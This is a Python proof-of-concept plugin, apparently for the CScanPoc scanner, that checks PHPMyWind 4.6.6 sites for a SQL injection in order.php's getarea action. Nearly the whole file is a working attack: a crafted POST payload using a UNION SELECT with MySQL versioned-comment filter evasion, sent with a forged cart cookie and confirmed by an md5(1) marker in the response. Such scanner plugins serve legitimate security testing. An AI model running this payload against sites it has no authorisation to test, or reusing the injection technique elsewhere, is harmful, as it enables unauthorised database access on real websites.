# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'PHPMyWind_0005'  # 平台漏洞编号，留空
    name = 'PHPMyWind SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-02-24'  # 漏洞公布时间
    desc = '''
        PHPMyWind 是一款基于PHP+MySQL开发，符合W3C标准的建站引擎。
        PHPMyWind SQL注入漏洞：
        /phpmywind/order.php?action=getarea
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=051687'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPMyWind'  # 漏洞应用名称
    product_version = '4.6.6'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '5b8a0eab-2896-414f-a888-a44eb63f23df'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            # No.3 refer=http://www.wooyun.org/bugs/wooyun-2010-051687
            payload = "/phpmywind/order.php?action=getarea"
            target = self.target + payload
            cookiepayload = "shoppingcart=1&username=1"
            postpayload = "datagroup=aa&areaval=500%20and%20@`'`%20/*!50000union*/%20select%201,md5(1),3,4,5,6#@`'`&level=1"
            code, head, body, errcode, final_url = hh.http(
                target, cookie=cookiepayload, post=postpayload)

            if code == 200 and 'c4ca4238a0b923820dcc509a6f75849' in body:
                # security_hole(target)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
